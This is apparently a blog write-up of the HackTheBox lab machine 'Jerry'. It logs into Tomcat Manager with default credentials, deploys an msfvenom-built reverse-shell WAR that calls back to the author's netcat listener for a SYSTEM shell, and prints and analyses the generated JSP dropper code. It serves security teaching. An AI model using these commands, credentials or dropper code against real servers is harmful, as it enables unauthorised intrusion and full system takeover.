---
title: HTB: Jerry
url: https://0xdf.gitlab.io/2018/11/17/htb-jerry.html
date: 2018-11-17T12:50:37+00:00
difficulty: Easy [20]
os: Windows
tags: hackthebox, htb-jerry, ctf, nmap, tomcat, war, msfvenom, jar, jsp, oscp-like-v2, oscp-like-v1
---

![](https://0xdfimages.gitlab.io/img/jerry-cover.png) Jerry is quite possibly the easiest box I’ve done on HackTheBox (maybe rivaled only by Blue). In fact, it was rooted in just over 6 minutes! There’s a Tomcat install with a default password for the Web Application Manager. I’ll use that to upload a malicious war file, which returns a system shell, and access to both flags.

## Box Info

| Name | [Jerry](https://hackthebox.com/machines/jerry)  [Jerry](https://hackthebox.com/machines/jerry) [Play on HackTheBox](https://hackthebox.com/machines/jerry) |
| --- | --- |
| Release Date | [30 Jun 2018](https://twitter.com/hackthebox_eu/status/1012286422206898177) |
| Retire Date | 04 May 2024 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Jerry |
| Radar Graph | Radar chart for Jerry |
| First Blood User | 00:06:18[echthros echthros](https://app.hackthebox.com/users/2846) |
| First Blood Root | 00:06:29[echthros echthros](https://app.hackthebox.com/users/2846) |
| Creator | [mrh4sh mrh4sh](https://app.hackthebox.com/users/2570) |

## Recon

### nmap

Nmap shows only 8080 open, running Tomcat:

```

root@kali# nmap -sT -p- --min-rate 5000 10.10.10.95
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-30 21:39 EDT
Nmap scan report for 10.10.10.95
Host is up (0.10s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds

root@kali# nmap -sV -sC -p 8080 -oA nmap/initial 10.10.10.95
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-30 21:40 EDT
Nmap scan report for 10.10.10.95
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Site doesn't have a title.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.66 seconds

```

### Website

#### Site

The site shows a default install of Tomcat:

![1530409432385](https://0xdfimages.gitlab.io/img/1530409432385.png)

#### Login

The default creds of “tomcat” / “s3cret” work to get access to the Tomcat Manager Application.

![1530409477005](https://0xdfimages.gitlab.io/img/1530409477005.png)

## Exploiting Tomcat

To get a shell, I’ll use the “WAR file to deploy” section of the manager application:

![1530409521172](https://0xdfimages.gitlab.io/img/1530409521172.png)

### Web Application Resource Files

A Web Application Resource (WAR) file is a single file container that holds all the potential files necessary for a Java-based web application. It can have Java Archives (.jar), Java Server Pages (.jsp), Java Servlets, Java classes, webpages, css, etc.

The `/WEB-INF` directory inside the archive is a special one, with a file named `web.xml` which defines the structure of the application.

Tomcat Manager makes it easy to deploy war files with a couple clicks, and since these can contain Java code, it’s a great target for gaining execution.

### Create war File

I’ll use `msfvenon` to create a windows reverse shell that can be caught with `nc`:

```

root@kali# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=9002 -f war > rev_shell-9002.war
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of war file: 52311 bytes

```

I’ll also need to know the name of the jsp page to activate it with curl. I’ll use `jar` to list the contents of the war.

```

root@kali# jar -ft rev_shell-9002.war
META-INF/
META-INF/MANIFEST.MF
WEB-INF/
WEB-INF/web.xml
ppaejmsg.jsp

```

Alternatively, if I wanted to use the web gui, I could click on the link without knowing the jsp name.

### Upload and Run

Now upload through the manager application, and then curl the page at `http://[host]/[war name]/[jsp]`:

```

root@kali# curl http://10.10.10.95:8080/rev_shell-9002/ppaejmsg.jsp

```

```

root@kali# nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.10.15.83] from (UNKNOWN) [10.10.10.95] 49193
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

```

## Flags

With a shell as system, it’s easy to get both flags:

```

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)  27,450,302,464 bytes free

C:\Users\Administrator\Desktop>cd flags
cd flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)  27,450,171,392 bytes free

 C:\Users\Administrator\Desktop\flags>type 2*
type 2*
2 for the price of 1.txt

user.txt
7004dbce...

root.txt
04a8b36e...

```

## Beyond Root - Inside the war File

I already looked at the files inside `rev_shell-9002.war` using `jar` to get the name of the jsp. Here that is again for reference:

```

root@kali# jar tf rev_shell-9002.war
META-INF/
META-INF/MANIFEST.MF
WEB-INF/
WEB-INF/web.xml
ppaejmsg.jsp

```

The war file is actually just a zip archive. If I look at the first few bytes, I’ll see the [file signature](https://en.wikipedia.org/wiki/List_of_file_signatures) for zip, `50 4B 03 04`:

```

root@kali# head -c 16 rev_shell-9002.war | xxd
00000000: 504b 0304 1400 0000 0000 bbab de4c 0000  PK...........L..

```

And I can even unzip it:

```

root@kali# unzip -l rev_shell-9002.war
Archive:  rev_shell-9002.war
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2018-06-30 21:29   META-INF/
       71  2018-06-30 21:29   META-INF/MANIFEST.MF
        0  2018-06-30 21:29   WEB-INF/
      266  2018-06-30 21:29   WEB-INF/web.xml
   149034  2018-06-30 21:29   ppaejmsg.jsp
---------                     -------
   149371                     5 files

```

Inside the archive, there’s three files: `META-INF/MANIFEST.MF`, `WEB-INF/web.xml`, and `ppaejmsg.jsp`. The `MANIFEST.MF` file just contains some version information:

```

Manifest-Version: 1.0
Created-By: 1.6.0_17 (Sun Microsystems Inc.)

```

The `WEB-INF/web.xml` file is quite simple in this case, just identifying the jsp by name, and the servlet name:

```

<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
<servlet>
<servlet-name>gqsrnqtizzhn</servlet-name>
<jsp-file>/ppaejmsg.jsp</jsp-file>
</servlet>
</web-app>

```

The meat of the code is in `ppaejmsg.jsp` (with long hex string truncated by me for readability):

```

 1 <%@ page import="java.io.*" %>
 2 <%
 3   String tjSRohYSIVTEYgR = "4d5a90000300000004000000ffff...";
 4   String pkALAjcf = System.getProperty("java.io.tmpdir") + "/lcmWDJSTuqXlU";
 5
 6   if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
 7     pkALAjcf = pkALAjcf.concat(".exe");
 8   }
 9
10   int ODEsMJtiDkS = tjSRohYSIVTEYgR.length();
11   byte[] YHxXvQEcNvT = new byte[ODEsMJtiDkS/2];
12   for (int PEQXASgLslZXAoO = 0; PEQXASgLslZXAoO < ODEsMJtiDkS; PEQXASgLslZXAoO += 2) {
13     YHxXvQEcNvT[PEQXASgLslZXAoO / 2] = (byte) ((Character.digit(tjSRohYSIVTEYgR.charAt(PEQXASgLslZXAoO), 16) << 4)
14                                               + Character.digit(tjSRohYSIVTEYgR.charAt(PEQXASgLslZXAoO+1), 16));
15   }
16
17   FileOutputStream BYhXIhapBQqShGa = new FileOutputStream(pkALAjcf);
18   BYhXIhapBQqShGa.write(YHxXvQEcNvT);
19   BYhXIhapBQqShGa.flush();
20   BYhXIhapBQqShGa.close();
21
22   if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1){
23     String[] NYqDzjSRU = new String[3];
24     NYqDzjSRU[0] = "chmod";
25     NYqDzjSRU[1] = "+x";
26     NYqDzjSRU[2] = pkALAjcf;
27     Process DrcLxlRyPVhwV = Runtime.getRuntime().exec(NYqDzjSRU);
28     if (DrcLxlRyPVhwV.waitFor() == 0) {
29       DrcLxlRyPVhwV = Runtime.getRuntime().exec(pkALAjcf);
30     }
31
32     File sGOssUgzJ = new File(pkALAjcf); sGOssUgzJ.delete();
33   } else {
34     String[] hxaporcZNI = new String[1];
35     hxaporcZNI[0] = pkALAjcf;
36     Process DrcLxlRyPVhwV = Runtime.getRuntime().exec(hxaporcZNI);
37   }
38 %>

```

Here’s what this code does:
1. Defines `tjSRohYSIVTEYgR` as a really long hex string, that starts with “4d5a”. I’ll immediately recognize that as the hex signature “MZ” used by Windows executable files. [Line 3]
2. Create a path to a file in the local temp directory with a random name. [Line 4]
3. If the OS string contains “windows”, append “.exe” to the end of that file name. [Lines 6-8]
4. Get the length of the hex string. [Line 10]
5. Create an array of bytes that’s half the hex string length. This makes sense since ascii hex uses two character to represent one byte. [Line 11]
6. Loop over the hex string, converting the hex into byte values and storing them in the array. [Lines 12-15]
7. Create a file stream object using the exe path generated earlier, and write the byte array to it. [Lines 17-20]
8. Check the OS for “windows”. Because it will be there, create an array of strings one long. Set the only entry to the string path to the exe. Pass that array of strings to `Runtime.getRuntime().exec()`. [Lines 22, 33-37]

For that last step, this makes use of the `exec` function’s implementation where it takes an array of strings that represent the command to run and arguments, from the [Java docs](https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html#exec(java.lang.String)):

> ```

> public Process exec(String[] cmdarray)
>              throws IOException
>
> ```

>
> Executes the specified command and arguments in a separate process.
>
> This is a convenience method. An invocation of the form `exec(cmdarray)` behaves in exactly the same way as the invocation `exec(cmdarray, null, null)`.
>
> - Parameters:
>
>   `cmdarray` - array containing the command to call and its arguments.
> - Returns:
>
>   A new `Process` object for managing the subprocess

Had the OS not been windows, it basically does the same thing, but runs `chmod +x` on the file first before running it. [Lines 23-32]

I made a copy of the file and removed everything but the hex string:

```

root@kali# wc hex
     1      1 147605 hex

```

I can then use xxd to decode it back into binary:

```

root@kali# cat hex | xxd -r -p > rev_shell.exe
root@kali# file rev_shell.exe
rev_shell.exe: PE32 executable (GUI) Intel 80386, for MS Windows

```

Just for grins, I ran it under `wine` and used `tcpdump` to look for network activity. I can see the attempts to connect from my current IP (10.10.14.3) to the IP I had when I made this binary (10.10.15.83):

```

root@kali# wine rev_shell.exe
000f:err:service:process_send_command receiving command result timed out
0015:err:service:process_send_command receiving command result timed out
002a:err:plugplay:handle_bus_relations Failed to load driver L"WineHID"

```

```

root@kali# tcpdump -n -i any port 9002
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
07:16:03.813941 IP 10.10.14.3.43648 > 10.10.15.83.9002: Flags [S], seq 1626341309, win 29200, options [mss 1460,sackOK,TS val 3698676684 ecr 0,nop,wscale 7], length 0
07:16:04.832595 IP 10.10.14.3.43648 > 10.10.15.83.9002: Flags [S], seq 1626341309, win 29200, options [mss 1460,sackOK,TS val 3698677702 ecr 0,nop,wscale 7], length 0
07:16:06.842599 IP 10.10.14.3.43648 > 10.10.15.83.9002: Flags [S], seq 1626341309, win 29200, options [mss 1460,sackOK,TS val 3698679712 ecr 0,nop,wscale 7], length 0
07:16:11.034693 IP 10.10.14.3.43648 > 10.10.15.83.9002: Flags [S], seq 1626341309, win 29200, options [mss 1460,sackOK,TS val 3698683904 ecr 0,nop,wscale 7], length 0
07:16:19.226987 IP 10.10.14.3.43648 > 10.10.15.83.9002: Flags [S], seq 1626341309, win 29200, options [mss 1460,sackOK,TS val 3698692097 ecr 0,nop,wscale 7], length 0
07:16:35.354833 IP 10.10.14.3.43648 > 10.10.15.83.9002: Flags [S], seq 1626341309, win 29200, options [mss 1460,sackOK,TS val 3698708224 ecr 0,nop,wscale 7], length 0
07:17:08.635109 IP 10.10.14.3.43648 > 10.10.15.83.9002: Flags [S], seq 1626341309, win 29200, options [mss 1460,sackOK,TS val 3698741505 ecr 0,nop,wscale 7], length 0
07:18:14.171986 IP 10.10.14.3.43650 > 10.10.15.83.9002: Flags [S], seq 1626341312, win 29200, options [mss 1460,sackOK,TS val 3698807042 ecr 0,nop,wscale 7], length 0
07:18:15.194660 IP 10.10.14.3.43650 > 10.10.15.83.9002: Flags [S], seq 1626341312, win 29200, options [mss 1460,sackOK,TS val 3698808064 ecr 0,nop,wscale 7], length 0
07:18:17.211338 IP 10.10.14.3.43650 > 10.10.15.83.9002: Flags [S], seq 1626341312, win 29200, options [mss 1460,sackOK,TS val 3698810081 ecr 0,nop,wscale 7], length 0
07:18:21.338744 IP 10.10.14.3.43650 > 10.10.15.83.9002: Flags [S], seq 1626341312, win 29200, options [mss 1460,sackOK,TS val 3698814208 ecr 0,nop,wscale 7], length 0
07:18:29.535012 IP 10.10.14.3.43650 > 10.10.15.83.9002: Flags [S], seq 1626341312, win 29200, options [mss 1460,sackOK,TS val 3698822405 ecr 0,nop,wscale 7], length 0
07:18:45.661418 IP 10.10.14.3.43650 > 10.10.15.83.9002: Flags [S], seq 1626341312, win 29200, options [mss 1460,sackOK,TS val 3698838531 ecr 0,nop,wscale 7], length 0
07:19:19.711096 IP 10.10.14.3.43650 > 10.10.15.83.9002: Flags [S], seq 1626341312, win 29200, options [mss 1460,sackOK,TS val 3698872581 ecr 0,nop,wscale 7], length 0
07:20:25.243620 IP 10.10.14.3.43652 > 10.10.15.83.9002: Flags [S], seq 1626341315, win 29200, options [mss 1460,sackOK,TS val 3698938113 ecr 0,nop,wscale 7], length 0
07:20:26.266908 IP 10.10.14.3.43652 > 10.10.15.83.9002: Flags [S], seq 1626341315, win 29200, options [mss 1460,sackOK,TS val 3698939137 ecr 0,nop,wscale 7], length 0
07:20:28.286061 IP 10.10.14.3.43652 > 10.10.15.83.9002: Flags [S], seq 1626341315, win 29200, options [mss 1460,sackOK,TS val 3698941156 ecr 0,nop,wscale 7], length 0
07:20:32.410792 IP 10.10.14.3.43652 > 10.10.15.83.9002: Flags [S], seq 1626341315, win 29200, options [mss 1460,sackOK,TS val 3698945280 ecr 0,nop,wscale 7], length 0
07:20:40.602702 IP 10.10.14.3.43652 > 10.10.15.83.9002: Flags [S], seq 1626341315, win 29200, options [mss 1460,sackOK,TS val 3698953472 ecr 0,nop,wscale 7], length 0
07:20:56.730818 IP 10.10.14.3.43652 > 10.10.15.83.9002: Flags [S], seq 1626341315, win 29200, options [mss 1460,sackOK,TS val 3698969600 ecr 0,nop,wscale 7], length 0
07:21:30.779060 IP 10.10.14.3.43652 > 10.10.15.83.9002: Flags [S], seq 1626341315, win 29200, options [mss 1460,sackOK,TS val 3699003649 ecr 0,nop,wscale 7], length 0

```

One thing that’s kind of neat is the spacing between the attempts. It looks like it sleeps for 1 second, then 2, 4, 8, 16, 32, 64, and then it goes back to 1 again. In fact, it looks like it scales from 1 to 64 3 times, and then quits.